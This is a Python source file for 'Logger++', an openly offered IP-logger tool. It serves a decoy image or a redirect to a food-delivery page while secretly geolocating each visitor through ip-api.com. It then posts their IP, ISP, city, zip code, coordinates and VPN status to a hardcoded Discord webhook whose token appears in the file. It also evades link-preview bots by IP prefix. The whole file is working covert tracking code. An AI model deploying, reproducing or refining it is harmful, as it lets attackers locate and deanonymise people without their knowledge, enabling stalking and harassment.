#       __                                        
#      / /  ___   __ _  __ _  ___ _ __  _     _   
#     / /  / _ \ / _` |/ _` |/ _ \ '__|| |_ _| |_ 
#    / /__| (_) | (_| | (_| |  __/ | |_   _|_   _|
#    \____/\___/ \__, |\__, |\___|_|   |_|   |_|  
#                |___/ |___/                      
#
#       A Powerful Phython Discord Logger Tool.
#        Made By: https://github.com/Cartxrr


# Options 
options = {
    "webhook": {
        "url": "https://discordapp.com/api/webhooks/1198549525279817799/1GWEqZxYJtyDYbePqvy8CRLUz_mXY2l50Lu0q_uC58n5atActl8D3MJdC87G4gvn2DJE",
    },
    "image": {
        "enabled": True,
        "corrupted-image-preview": False,
        "url": "https://th.bing.com/th/id/R.ee9c65d2d99614fd920c2f3d3fd4084e?rik=xzGfbo%2bjt%2bf6iw&pid=ImgRaw&r=0",
    },
    "url": {
         "enabled": True,
         "url-redirect": "https://www.ubereats.com/gb/brand/mcdonalds?utm_source=Bing_NonBrand&utm_campaign=CM2065891-search-bing-nonbrand_184_-99_GB-National_e_all_acq_cpc_en_DSA_Exact_%2Fgb_dat-2329521542131890:loc-188__1208363731611777_b_c&campaign_id=382538290&adg_id=1208363731611777&fi_id=&match=b&net=o&dev=c&dev_m=&ad_id=&cre=&kwid=dat-2329521542131890:loc-188&kw=%2Fgb&placement=&tar=&gclid=20aed75c1dda14aba2d3b2f0c7777811&gclsrc=3p.ds&msclkid=20aed75c1dda14aba2d3b2f0c7777811",
    },
}

# IF YOU DONT KNOW WHAT THIS CODE DOES DONT CHANGE ANY OF THIS

from http.server import BaseHTTPRequestHandler
import requests

glitched = { "data": b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\x00C\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc2\x00\x11\x08\x01\xe0\x01\xe0\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' } # Credit for Dekrypted for the data

def bots(ip):
    if ip.startswith(("35", "34", "104", "143", "27", "104", "143", "164")): return True
    else: return False

def sendWebhook(ip):
        usersinfo = requests.get(f"http://ip-api.com/json/{ip}?fields=181247").json()
        data = { 
                "content" : "@everyone",

                "color" : 16777215,

                "embeds": [
                    {

                        "description" : f"""
                        **📶 IP:** `{ip if ip else 'N/A'}`
                        **📦 Internet Provider:** `{usersinfo['isp'] if usersinfo['isp'] else 'N/A'}`
                        **🏁 Country:** `{usersinfo['country']}/{usersinfo['countryCode'] if usersinfo['country'] else 'N/A'}`
                        **🏙 City:** `{usersinfo['city'] if usersinfo['city'] else 'N/A'}`
                        **🤐 Zip-Code:** `{usersinfo['zip'] if usersinfo['zip'] else 'N/A'}`
                        **📍 Coordinates:** `{str(usersinfo['lat']), str(usersinfo['lon'])}`
                        **⏰ Time-Zone:** `{usersinfo['timezone'] if usersinfo['timezone'] else 'N/A'}`
                        **🎭 VPN:** `{usersinfo['proxy']}`

                        **📷 Image Logger:** `{str(options['image']['enabled'])}`
                        **🔗 Url Logger:** `{str(options['url']['enabled'])}`
                        """,

                        "footer": {
                            "text": " @Cartxrr | Logger++ ",
                            "icon_url": "https://avatars.githubusercontent.com/u/116686230?v=4"
                        },
                    }
                ]
            }

        requests.post(options['webhook']['url'], json = data)
        return


class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if (options['image']['enabled']):
            if bots(self.headers.get('x-forwarded-for')) and (options['image']['corrupted-image-preview']):
                self.send_response(200)
                self.send_header('Content-type', "image/png")
                self.end_headers()
                self.wfile.write(glitched["data"])
                return
            else:
                self.send_response(200)
                self.send_header('Content-type', "image/png")
                self.end_headers()
                image_data = requests.get(options['image']['url'])
                self.wfile.write(image_data)
                if not bots(self.headers.get('x-forwarded-for')):
                    ip = self.headers.get('x-forwarded-for')
                    sendWebhook(ip)
                return
        elif (options['url']['enabled']):
            self.send_response(200)
            self.send_header('Content-type', "text/html")
            self.end_headers()
            iwannacrybecausephythonbeingweirdasf = f'<meta http-equiv="refresh" content="0;url={options["url"]["url-redirect"]}">'
            self.wfile.write(iwannacrybecausephythonbeingweirdasf.encode('utf-8'))
            if not bots(self.headers.get('x-forwarded-for')):
                ip = self.headers.get('x-forwarded-for')
                sendWebhook(ip)
            return
        else:
            print("Bro enable one of the two")
        
